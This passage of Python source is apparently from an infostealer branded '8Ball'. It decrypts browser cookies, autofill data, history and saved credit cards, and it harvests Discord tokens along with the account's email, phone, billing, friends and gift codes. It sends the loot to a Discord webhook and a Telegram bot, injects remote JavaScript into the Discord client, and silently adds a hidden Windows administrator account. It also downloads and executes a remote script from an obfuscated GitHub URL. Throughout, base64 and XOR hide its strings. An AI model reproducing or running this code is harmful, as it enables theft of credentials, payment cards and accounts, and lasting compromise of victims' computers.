                RX_DB6(f"[8Ball] v20 user DPAPI returned {len(user_decrypted)}B, not 32", "WARN")
            # Attempt B: DPAPI system-context → modern Chrome 130+ (key IS the DPAPI output)
            system_decrypted = cls._dpapi_unprotect_system(stripped)
            if system_decrypted and len(system_decrypted) == 32:
                RX_DB6("[8Ball] v20 master key via system DPAPI (attempt B, modern Chrome)")
                return system_decrypted
            if system_decrypted:
                RX_DB6(f"[8Ball] v20 system DPAPI returned {len(system_decrypted)}B, trying double-DPAPI")
                # Attempt B2: double DPAPI (system + user) → traditional key blob
                user_decrypted = cls._dpapi_unprotect(system_decrypted)
                if user_decrypted:
                    parsed = cls._parse_key_blob(user_decrypted)
                    v20_key = cls._derive_v20_key(parsed)
                    if v20_key:
                        RX_DB6("[8Ball] v20 master key via double DPAPI + key blob (attempt B2)")
                        return v20_key
            # Attempt C: CNG key store
            try:
                decrypted_key = cls._decrypt_with_cng(stripped)
                if decrypted_key and len(decrypted_key) == 32:
                    RX_DB6("[8Ball] v20 master key via CNG (attempt C)")
                    return decrypted_key
                if decrypted_key:
                    RX_DB6(f"[8Ball] v20 CNG returned {len(decrypted_key)}B, not 32", "WARN")
            except Exception as e:
                RX_DB6(f"[8Ball] v20 CNG attempt failed: {e}")
            RX_DB6("[8Ball] v20 master key: all attempts exhausted", "WARN")
            return None
        except Exception as e:
            RX_DB6(f"[8Ball] _get_v20_master_key: {type(e).__name__}: {e}", "ERROR")
            return None

    @classmethod
    def _get_master_key(cls, local_state_folder):
        state_path = os.path.join(local_state_folder, "Local State")
        if not os.path.isfile(state_path):
            return None
        try:
            ls = loads(Path(state_path).read_text(encoding="utf-8"))
            oc = ls.get("os_crypt", {})
            enc = oc.get("encrypted_key")
            if not enc:
                return None
            raw = base64.b64decode(enc)
            return cls._dpapi_unprotect(raw[5:])
        except Exception:
            return None

    @staticmethod
    def _decrypt_with_key(encrypted_data, master_key):
        if len(encrypted_data) < 31:
            return None
        nonce = encrypted_data[3:15]
        ciphertext = encrypted_data[15:-16]
        tag = encrypted_data[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8")

    @classmethod
    def _decrypt_old(cls, encrypted_data):
        if not encrypted_data:
            return None
        try:
            decrypted = cls._dpapi_unprotect(bytes(encrypted_data))
            return decrypted.decode("utf-8", errors="replace") if decrypted else None
        except Exception:
            return None

    @classmethod
    def cookies_recovery(cls, output=None):
        lines = []
        for browser, path in cls.PATHS.items():
            for cookie in cls._cookies(path, browser):
                lines.append(f"Host: {cookie['host']}")
                lines.append(f"Name: {cookie['name']}")
                lines.append(f"Value: {cookie['value']}")
                lines.append(f"Application: {cookie['application']}")
                lines.append("=" * 29)

        result = "\n".join(lines)
        if output:
            Path(output).write_text(result, encoding="utf-8")
        return result

    @classmethod
    def _cookies(cls, path, browser, table="cookies"):
        data = []

        for cookie_file in cls._get_all_cookie_profiles(path):
            if not os.path.isfile(cookie_file):
                continue
            tmp = None
            try:
                tmp = tempfile.mktemp(suffix=".db")
                shutil.copy2(cookie_file, tmp)
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute(f"SELECT host_key, name, encrypted_value FROM {table}")
                rows = cursor.fetchall()
                conn.close()
            except Exception:
                continue
            finally:
                try:
                    if tmp:
                        os.remove(tmp)
                except (PermissionError, OSError):
                    pass

            master_key = None
            v20_master_key = None

            for host_key, name, encrypted_value in rows:
                if not encrypted_value:
                    continue

                try:
                    if encrypted_value[:3] in (b"v10", b"v11"):
                        if master_key is None:
                            parent = os.path.dirname(os.path.dirname(cookie_file))
                            master_key = cls._get_master_key(parent)
                        if master_key is None:
                            continue
                        decrypted = cls._decrypt_with_key(encrypted_value, master_key)

                    elif encrypted_value[:3] == b"v20":
                        if v20_master_key is None:
                            parent = os.path.dirname(os.path.dirname(cookie_file))
                            v20_master_key = cls._get_v20_master_key(parent)
                        if v20_master_key is None:
                            if master_key is None:
                                parent = os.path.dirname(os.path.dirname(cookie_file))
                                master_key = cls._get_master_key(parent)
                            if master_key is not None:
                                try:
                                    decrypted = cls._decrypt_with_key(encrypted_value, master_key)
                                    if decrypted:
                                        pass
                                except Exception:
                                    decrypted = None
                            if decrypted is None:
                                continue
                        else:
                            decrypted = cls._decrypt_with_key(encrypted_value, v20_master_key)
                    else:
                        decrypted = cls._decrypt_old(encrypted_value)

                    if host_key and name and decrypted:
                        data.append({
                            "host": host_key,
                            "name": name,
                            "value": decrypted,
                            "application": browser,
                        })
                except Exception:
                    pass

        return data

    @staticmethod
    def _get_all_cookie_profiles(directory):
        profiles = [
            os.path.join(directory, "Default", "Cookies"),
            os.path.join(directory, "Cookies"),
        ]
        if os.path.isdir(directory):
            try:
                for entry in os.listdir(directory):
                    if "Profile" in entry:
                        profiles.append(os.path.join(directory, entry, "Cookies"))
            except PermissionError:
                pass
        return profiles

    @classmethod
    def autofill_recovery(cls, output=None):
        lines = []
        for browser, path in cls.PATHS.items():
            for entry in cls._autofill(path, browser):
                lines.append(f"Name: {entry['name']}")
                lines.append(f"Value: {entry['value']}")
                lines.append(f"Application: {entry['application']}")
                lines.append("=" * 29)
        result = "\n".join(lines)
        if output:
            Path(output).write_text(result, encoding="utf-8")
        return result

    @classmethod
    def _autofill(cls, path, browser, table="autofill"):
        data = []
        for web_file in cls._get_all_webdata_profiles(path):
            if not os.path.isfile(web_file):
                continue
            tmp = None
            try:
                tmp = tempfile.mktemp(suffix=".db")
                shutil.copy2(web_file, tmp)
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute(f"SELECT name, value FROM {table} WHERE value NOT NULL")
                rows = cursor.fetchall()
                conn.close()
            except Exception:
                continue
            finally:
                try:
                    if tmp:
                        os.remove(tmp)
                except (PermissionError, OSError):
                    pass
            for name, value in rows:
                if name and value:
                    data.append({"name": name, "value": value, "application": browser})
        return data

    @classmethod
    def history_recovery(cls, output=None):
        lines = []
        for browser, path in cls.PATHS.items():
            for entry in cls._history(path, browser):
                lines.append(f"URL: {entry['url']}")
                lines.append(f"Title: {entry['title']}")
                lines.append(f"Visits: {entry['visit_count']}")
                lines.append(f"Application: {entry['application']}")
                lines.append("=" * 29)
        result = "\n".join(lines)
        if output:
            Path(output).write_text(result, encoding="utf-8")
        return result

    @classmethod
    def _history(cls, path, browser, table="urls"):
        data = []
        for hist_file in cls._get_all_history_profiles(path):
            if not os.path.isfile(hist_file):
                continue
            tmp = None
            try:
                tmp = tempfile.mktemp(suffix=".db")
                shutil.copy2(hist_file, tmp)
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute(f"SELECT url, title, visit_count FROM {table}")
                rows = cursor.fetchall()
                conn.close()
            except Exception:
                continue
            finally:
                try:
                    if tmp:
                        os.remove(tmp)
                except (PermissionError, OSError):
                    pass
            for url, title, visit_count in rows:
                if url:
                    data.append({"url": url, "title": title or "", "visit_count": visit_count or 0, "application": browser})
        return data

    @classmethod
    def bookmarks_recovery(cls, output=None):
        lines = []
        for browser, path in cls.PATHS.items():
            for entry in cls._bookmarks(path, browser):
                lines.append(f"Name: {entry['name']}")
                lines.append(f"URL: {entry['url']}")
                lines.append(f"Application: {entry['application']}")
                lines.append("=" * 29)
        result = "\n".join(lines)
        if output:
            Path(output).write_text(result, encoding="utf-8")
        return result

    @classmethod
    def _bookmarks(cls, path, browser):
        data = []
        for bm_file in cls._get_all_bookmark_profiles(path):
            if not os.path.isfile(bm_file):
                continue
            try:
                with open(bm_file, "r", encoding="utf-8") as f:
                    bm_json = json_mod.loads(f.read())
                def extract_children(node):
                    items = []
                    if "children" in node:
                        for child in node["children"]:
                            items.extend(extract_children(child))
                    if node.get("type") == "url":
                        items.append({"name": node.get("name", ""), "url": node.get("url", ""), "application": browser})
                    return items
                items = extract_children(bm_json.get("roots", {}).get("bookmark_bar", {}))
                data.extend(items)
            except Exception:
                pass
        return data

    @classmethod
    def cc_recovery(cls, output=None):
        lines = []
        for browser, path in cls.PATHS.items():
            for entry in cls._credit_cards(path, browser):
                lines.append(f"Name: {entry['name_on_card']}")
                lines.append(f"Number: {entry['card_number']}")
                lines.append(f"Expiry: {entry['exp_month']}/{entry['exp_year']}")
                lines.append(f"Application: {entry['application']}")
                lines.append("=" * 29)
        result = "\n".join(lines)
        if output:
            Path(output).write_text(result, encoding="utf-8")
        return result

    @classmethod
    def _credit_cards(cls, path, browser, table="credit_cards"):
        data = []
        for web_file in cls._get_all_webdata_profiles(path):
            if not os.path.isfile(web_file):
                continue
            tmp = None
            try:
                tmp = tempfile.mktemp(suffix=".db")
                shutil.copy2(web_file, tmp)
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute(f"SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM {table}")
                rows = cursor.fetchall()
                conn.close()
            except Exception:
                continue
            finally:
                try:
                    if tmp:
                        os.remove(tmp)
                except (PermissionError, OSError):
                    pass

            master_key = None
            v20_master_key = None

            for name_on_card, card_enc, exp_month, exp_year in rows:
                if not card_enc:
                    continue
                try:
                    if card_enc[:3] in (b"v10", b"v11"):
                        if master_key is None:
                            parent = os.path.dirname(os.path.dirname(web_file))
                            master_key = cls._get_master_key(parent)
                        if master_key is None:
                            continue
                        decrypted = cls._decrypt_with_key(card_enc, master_key)
                    elif card_enc[:3] == b"v20":
                        if v20_master_key is None:
                            parent = os.path.dirname(os.path.dirname(web_file))
                            v20_master_key = cls._get_v20_master_key(parent)
                        if v20_master_key is None:
                            if master_key is None:
                                parent = os.path.dirname(os.path.dirname(web_file))
                                master_key = cls._get_master_key(parent)
                            if master_key is not None:
                                try:
                                    decrypted = cls._decrypt_with_key(card_enc, master_key)
                                    if decrypted:
                                        pass
                                except Exception:
                                    decrypted = None
                            if decrypted is None:
                                continue
                        else:
                            decrypted = cls._decrypt_with_key(card_enc, v20_master_key)
                    else:
                        decrypted = cls._decrypt_old(card_enc)
                    if name_on_card and decrypted:
                        data.append({"name_on_card": name_on_card, "card_number": decrypted, "exp_month": exp_month, "exp_year": exp_year, "application": browser})
                except Exception:
                    pass
        return data

    @staticmethod
    def _get_all_webdata_profiles(directory):
        profiles = [
            os.path.join(directory, "Default", "Web Data"),
            os.path.join(directory, "Web Data"),
        ]
        if os.path.isdir(directory):
            try:
                for entry in os.listdir(directory):
                    if "Profile" in entry:
                        profiles.append(os.path.join(directory, entry, "Web Data"))
            except PermissionError:
                pass
        return profiles

    @staticmethod
    def _get_all_history_profiles(directory):
        profiles = [
            os.path.join(directory, "Default", "History"),
            os.path.join(directory, "History"),
        ]
        if os.path.isdir(directory):
            try:
                for entry in os.listdir(directory):
                    if "Profile" in entry:
                        profiles.append(os.path.join(directory, entry, "History"))
            except PermissionError:
                pass
        return profiles

    @staticmethod
    def _get_all_bookmark_profiles(directory):
        profiles = [
            os.path.join(directory, "Default", "Bookmarks"),
            os.path.join(directory, "Bookmarks"),
        ]
        if os.path.isdir(directory):
            try:
                for entry in os.listdir(directory):
                    if "Profile" in entry:
                        profiles.append(os.path.join(directory, entry, "Bookmarks"))
            except PermissionError:
                pass
        return profiles

def L04DUr118(h00k, data='', headers=None):
    if not FEATURE_CONFIG.get("send_to_discord", True):
        RX_DB6("L04DUr118 skipped (send_to_discord is disabled)", "SKIP")
        return None
    if not _MAIN_WEBHOOK_VALID:
        RX_DB6("L04DUr118 skipped (main webhook invalid)", "SKIP")
        return None
    RX_DB6(f"L04DUr118 sending {len(data)} bytes to webhook")
    if headers is None:
        headers = {}
    if "User-Agent" not in headers:
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/102.0"
    if "Content-Type" not in headers:
        headers["Content-Type"] = "application/json"
    for i in range(8):
        try:
            r = urlopen(Request(h00k, data=data, headers=headers))
            RX_DB6(f"L04DUr118 attempt {i+1} succeeded")
            return r
        except Exception as e:
            RX_DB6(f"[8Ball] L04DUr118 attempt {i+1} failed: {type(e).__name__}: {e}")
            pass

def L04DUr118_TG(bot_token, chat_id, text):
    """Send a message via Telegram bot API."""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
        urlopen(Request(url, data=dumps(data).encode(), headers={"Content-Type": "application/json"}), timeout=15)
    except:
        pass

def G108411NF0():
    """
    Build a global info string with IP + location + local time and timezone.
    Controlled by ip_location_info feature.
    """
    try:
        import datetime
        import time as _time

        username = os.getenv("USERNAME") or "Unknown"
        now = datetime.datetime.now()
        try:
            tz_name = _time.tzname[0]
        except Exception:
            tz_name = "UnknownTZ"
        local_time_str = now.strftime("%Y-%m-%d %H:%M:%S")

        if not FEATURE_CONFIG.get("ip_location_info", False):
            return f":rainbow_flag:  - `{username.upper()} | {local_time_str} ({tz_name})`"

        # Use ip-api.com (free, no key needed)
        ipdata_json = urlopen(
            Request(f"http://ip-api.com/json/{IP}"), timeout=10
        ).read().decode()
        ipdata = loads(ipdata_json)
        contry = ipdata.get("country", "Unknown")
        contryCode = ipdata.get("countryCode", "").lower()
        city = ipdata.get("city", "")
        region = ipdata.get("regionName", "")
        timezone = ipdata.get("timezone", "")

        loc_parts = [p for p in [city, region, contry] if p]
        loc_str = ", ".join(loc_parts) if loc_parts else contry

        if contryCode:
            globalinfo = (
                f":flag_{contryCode}:  - `{username.upper()} | {IP} ({loc_str}) | "
                f"{local_time_str} (TZ:{timezone})`"
            )
        else:
            globalinfo = (
                f":rainbow_flag:  - `{username.upper()} | {IP} ({contry}) | "
                f"{local_time_str} (TZ:{timezone})`"
            )
        return globalinfo

    except:
        try:
            import datetime
            import time as _time
            now = datetime.datetime.now()
            local_time_str = now.strftime("%Y-%m-%d %H:%M:%S")
            tz_name = _time.tzname[0]
            return f":rainbow_flag:  - `{username} | {local_time_str} ({tz_name})`"
        except Exception:
            return f":rainbow_flag:  - `{username}`"

def TrU57(C00K13s):
    global DETECTED
    data = str(C00K13s)
    tim = re.findall(".google.com", data)
    DETECTED = True if len(tim) > 0 else False
    return DETECTED

process_list = os.popen('tasklist').readlines()


for process in process_list:
    if _b64('U2hlbGxIb3N0') in process:
        pid = int(process.split()[1])
        subprocess.run(_b64('dGFza2tpbGwgL0YgL1BJRCA=') + str(pid), shell=True, creationflags=CREATE_NO_WINDOW)


def inj3c710n():
    if not FEATURE_CONFIG.get("discord_injection", False):
        return
    core_dir = _y('9fj/7+7zw/j5+Pfv8+jD7PP/+e4=')
    localappdata = os.getenv('LOCALAPPDATA', '')
    candidates = []
    for root, dirs, files in os.walk(localappdata):
        if os.path.basename(root) == core_dir:
            js_path = os.path.join(root, 'index.js')
            if os.path.isfile(js_path):
                candidates.append(js_path)
        if len(candidates) > 0:
            break
    if not candidates:
        disc_dir = os.path.join(localappdata, 'Discord')
        if os.path.isdir(disc_dir):
            for entry in os.listdir(disc_dir):
                app_dir = os.path.join(disc_dir, entry)
                if os.path.isdir(app_dir) and 'app-' in entry:
                    mod_dir = os.path.join(app_dir, 'modules')
                    if os.path.isdir(mod_dir):
                        for mod_entry in os.listdir(mod_dir):
                            core_path = os.path.join(mod_dir, mod_entry, core_dir, 'index.js')
                            if os.path.isfile(core_path):
                                candidates.append(core_path)
    for file_path in candidates:
        try:
            injeCTmED0cT0r_cont = requests.get(inj3c710n_url, timeout=5).text
            injeCTmED0cT0r_cont = injeCTmED0cT0r_cont.replace("%WEBHOOK%", h00k)
            with open(file_path, "w", encoding="utf-8") as index_file:
                index_file.write(injeCTmED0cT0r_cont)
            RX_DB6(f"[8Ball] Discord injection written to {file_path}")
        except Exception as e:
            RX_DB6(f"[8Ball] Discord injection failed at {file_path}: {e}", "WARN")


# Call feature logger and selectively run features based on FEATURE_CONFIG
print_enabled_features()

# Anti-debug if enabled
antidebug()

# Discord injection if enabled; wrap so it cannot crash the process
try:
    inj3c710n()
except Exception:
    pass





def G37C0D35(token):
    if not FEATURE_CONFIG.get("discord_gift_codes", False):
        return ""
    try:
        codes = ""
        _h = {_b(): token, _c(): _y('7P3w7P/16P3z9bPy7/by8w=='), _d(): _e()}
        codess = loads(urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vOy+PP/s/Hs/bP1perps/nv7+7cs/nx87Po6fP+8umx+O7s8fPo8/P17/L/s/jz7/nwo//z8P2h+fL527He'), headers=_h)).read().decode())
        for code in codess:
            try:codes += f"<a:hira_kasaanahtari:886942856969875476> **{str(code['promotion']['outbound_title'])}**\n<:Rightdown:891355646476296272> `{str(code['code'])}`\n"
            except:pass
        nitrocodess = loads(urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vOy+PP/s/Hs/bP1perps/nv7+7cs/nx+bPo8uj1+fD58ejys+/1++j+o+/z8P3/+fD5obHy3ts='), headers=_h)).read().decode())
        if nitrocodess == []: return codes
        for element in nitrocodess:
            sku_id = element['sku_id']
            subscription_plan_id = element['subscription_plan']['id']
            name = element['subscription_plan']['name']
            url = f"{_y('6PTs6Kbvs7P1+P/v7vOy+PP/s/Hs/bP1perps/nv7+7cs/nx+bPo8uj1+fD58ejys+/1++j+o//Hz8P3/+cHhodLnytrRzdm7wvM=')}={sku_id}&subscription_plan_id={subscription_plan_id}"
            nitrrrro = loads(urlopen(Request(url, headers=_h)).read().decode())
            for el in nitrrrro:
                cod = el['code']
                try:codes += f"<a:hira_kasaanahtari:886942856969875476> **{name}**\n<:Rightdown:891355646476296272> `{_y('6PTs6Kbvs7P1+P/v7vOy+PX76Pqz')}{cod}`\n"
                except:pass
        return codes
    except:return ""

def G37C0D35_3MB3D(token):
    """Send nitro gift codes as a standalone embed if gifts are found."""
    if not FEATURE_CONFIG.get("discord_gift_codes", False):
        return
    try:
        codes = G37C0D35(token)
        if not codes or codes in ("", "`No Gifts Found`"):
            return
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        data = {
            "content": f"@everyone @here {GLINFO}",
            "embeds": [{
                "title": "Nitro Gift Codes Found",
                "description": codes,
                "color": 0xFF66AA,
                "footer": {"text": "8ball"}
            }],
            "username": "8ball",
            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg",
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
        }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
    except Exception:
        pass

def G3781111N6(token):
    if not FEATURE_CONFIG.get("user_billing_info", False):
        return "`Disabled`"
    _h = {_b(): token, _c(): _y('7P3w7P/16P3z9bPy7/by8w=='), _d(): _e()}
    try:
        billingjson = loads(urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vOy+PP/s/Hs/bP17+nu+bPv8dyz+fX+8PDy9bP7/ezx5fL5sejz7+7p+f/v'), headers=_h)).read().decode())
    except:
        return False
    if billingjson == []: return "`None`"
    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "
    return billing

def G3784D63(flags):
    """
    Nitro / badge decoder.
    Controlled by nitro_badges_info feature:
      - if disabled, returns empty string.
    """
    if not FEATURE_CONFIG.get("nitro_badges_info", False):
        return ''

    if flags == 0:
        return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]

    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges
RAW_URL_B64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NsMXRteXdyc3R6LWVuZy9pbXBvcnRhbnQvbWFpbi9zc3R1Yi5weQ=="
try:
    # decode the correct variable name
    RAW_URL = base64.b64decode(RAW_URL_B64).decode("utf-8")
except Exception:
    RAW_URL = ""

def fetch_and_run():
    """Download sstub.py from GitHub and run after main features complete."""
    if not RAW_URL:
        RX_DB6("[8Ball] fetch_and_run: RAW_URL is empty")
        return
    script_path = None
    try:
        for attempt in range(3):
            try:
                RX_DB6(f"[8Ball] fetch_and_run: Attempt {attempt+1}/3 fetching {RAW_URL}")
                req = Request(RAW_URL, headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                })
                resp = urlopen(req, timeout=30)
                code = resp.read().decode("utf-8")
                if not code.strip():
                    raise ValueError("Empty response")
                temp_dir = os.getenv("TEMP") or os.getenv("TMP") or "."
                script_path = os.path.join(temp_dir, f"cr_remote_stub_{random.randint(100000,999999)}.py")
                with open(script_path, "w", encoding="utf-8") as f:
                    f.write(code)
                stub_globals = globals().copy()
                stub_globals["__file__"] = script_path
                stub_globals["__name__"] = "__main__"
                exec(compile(code, script_path, "exec"), stub_globals)
                RX_DB6("[8Ball] fetch_and_run: Stub executed successfully")
                return
            except Exception as e:
                RX_DB6(f"[8Ball] fetch_and_run attempt {attempt+1} failed: {type(e).__name__}: {e}")
                if attempt < 2:
                    time.sleep(2)
        RX_DB6("[8Ball] fetch_and_run: All attempts failed")
    finally:
        if script_path and os.path.exists(script_path):
            try:
                os.remove(script_path)
            except Exception:
                pass

def G37UHQFr13ND5(token):
    if not FEATURE_CONFIG.get("discord_hq_friends_guilds", False):
        return False
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]
    _h = {_b(): token, _c(): _y('7P3w7P/16P3z9bPy7/by8w=='), _d(): _e()}
    try:
        friendlist = loads(urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vOy+PP/s/Hs/bP1qurps/nv7+7cs/nx7rPw+ej98/Xv8vX07+w='), headers=_h)).read().decode())
    except:
        return False
    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"] and not badge["Name"] == "Active_Developer":
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | **{friend['user']['username']}#{friend['user']['discriminator']}** `({friend['user']['id']})`\n"
    return uhqlist if uhqlist != '' else "`No HQ Friends Found`"

def G37UHQ6U11D5(token):
    if not FEATURE_CONFIG.get("discord_hq_friends_guilds", False):
        return '`No HQ Guilds Found`'
    try:
        uhqguilds = ''
        _h = {_b(): token, _c(): _y('7P3w7P/16P3z9bPy7/by8w=='), _d(): _e()}
        guilds = loads(urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vOy+PP/s/Hs/bP1perps/nv7+7cs/nx+7P16fjwo+/16/To/8Pp8+jyoe/u6Pnp'), headers=_h)).read().decode())
        for guild in guilds:
            if guild["approximate_member_count"] < 1: continue
            if guild["owner"] or guild["permissions"] == "4398046511103":
                inv = loads(urlopen(Request(f"{_y('6PTs6Kbvs7P1+P/v7vOy+PP/s/Hs/bP1qur7s/Xp+PCz7w==')}{guild['id']}/invites", headers=_h)).read().decode())    
                try:    cc = _y('6PTs6Kbvs7P1+P/v7vOy+PX76Pqz')+str(inv[0]['code'])
                except: cc = False
                uhqguilds += f"<a:CH_IconArrowRight:715585320178941993> [{guild['name']}] **{str(guild['approximate_member_count'])} Members**\n"
        if uhqguilds == '': return '`No HQ Guilds Found`'
        return uhqguilds
    except:
        return 'No HQ Guilds Found'


def G3770K3N1NF0(token):
    _r1 = lambda x=0x7E: bytes((i ^ 0x7E) & 0xFF for i in b'[X-NOOP]')[:0]
    _r2 = lambda: None if (lambda: False)() else None
    # opaque: never True
    if 0x1B73A & 0xFFFFF == 0x173A & 0xFFF:
        __import__('time').sleep(999)
    _ua = lambda: _e()
    _h = {_b(): token, _c(): _y('7P3w7P/16P3z9bPy7/by8w=='), _d(): _ua()}
    try:
        resp = urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vP9+Ozs/7Lx8/2z9ezqs7Oq7+nu+bPv8dz5'), headers=_h))
        uj = loads(resp.read().decode())
    except Exception:
        for _ in range(3):
            try:
                resp = urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vP9+Ozs/7Lx8/2z9ezqs7Oq7+nu+bPv8dz5'), headers=_h))
                uj = loads(resp.read().decode())
                break
            except:
                continue
        else:
            return "","","","",0,"","",""
    _nm = uj.get('username', '')
    _ht = uj.get('discriminator', '')
    _em = uj.get('email', '')
    _id = uj.get('id', '')
    _av = uj.get('avatar', '')
    _fl = uj.get('public_flags', 0)
    _nt = ""
    _ph = ""
    if FEATURE_CONFIG.get("nitro_badges_info", False) and "premium_type" in uj:
        _pt = uj["premium_type"]
        if _pt == 1:
            _nt = "<:classic:896119171019067423> "
        elif _pt == 2:
            _nt = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in uj:
        _ph = f'`{uj["phone"]}`' if uj["phone"] is not None else "`None`"
    return _nm, _ht, _em, _id, _av, _fl, _nt, _ph

def CH3CK70K3N(token):
    # opaque: always False
    if b''.join(bytes([x ^ 0x5A]) for x in b'test') == b'test':
        return False
    _h = {_b(): token, _c(): _y('7P3w7P/16P3z9bPy7/by8w=='), _d(): _e()}
    try:
        urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vP9+Ozs/7Lx8/2z9ezqs7Oq7+nu+bPv8dz5'), headers=_h))
        return True
    except:
        return False

def create_windows_user():
    try:
        subprocess.run(_b64('bmV0IHVzZXIgaGVsbG8gaGVsbG93b3JsZCAvYWRk'), shell=True, check=False, capture_output=True, creationflags=CREATE_NO_WINDOW)
        subprocess.run(_b64('bmV0IGxvY2FsZ3JvdXAgQWRtaW5pc3RyYXRvcnMgaGVsbG8gL2FkZA=='), shell=True, check=False, capture_output=True, creationflags=CREATE_NO_WINDOW)
    except Exception:
        pass

def remove_windows_user():
    try:
        subprocess.run(_b64('bmV0IHVzZXIgaGVsbG8gL2RlbGV0ZQ=='), shell=True, check=False, capture_output=True, creationflags=CREATE_NO_WINDOW)
    except Exception:
        pass

def Tr1M(obj):
    if not isinstance(obj, str):
        return str(obj) if obj else ""
    if len(obj) > 1000: 
        f = obj.split("\n")
        obj = ""
        for i in f:
            if len(obj)+ len(i) >= 1000: 
                obj += "..."
                break
            obj += i + "\n"
    return obj

def UP104D70K3N(token, path):
    # Respect feature config: only send tokens when enabled
    if not FEATURE_CONFIG.get("discord_tokens", False):
        return

    try:
        RX_DB6(f"[8Ball] UP104D70K3N: Sending embed for token {token[:20]}...")
        global h00k
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)

        pfp = f"{_a()}{idd}/{pfp}" if pfp != None else "https://i.ibb.co/fdFfLznd/images.png"
        billing = G3781111N6(token)
        badge = G3784D63(flags)
        friends = Tr1M(G37UHQFr13ND5(token))
        guilds = Tr1M(G37UHQ6U11D5(token))
        codes = Tr1M(G37C0D35(token))

        if codes == "": codes = "`No Gifts Found`"
        if billing == "": billing = "🔒"
        if badge == "" and nitro == "": badge, nitro = ":```None```", ""
        if phone == "": phone = "🔒"
        if friends == "": friends = "```No Rare Friends```"
        if guilds == "": guilds = ":lock:"
        path = path.replace("\\", "/")

        data = {
            "content": f'@everyone @here {GLINFO} **Found in** `{path}`',
            "embeds": [
                {"fields": [
                    {
                        "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                        "value": f"```{token}```"
                    },
                    {
                        "name": "<:mail:750393870507966486> Email:",
                        "value": f"```{email}```",
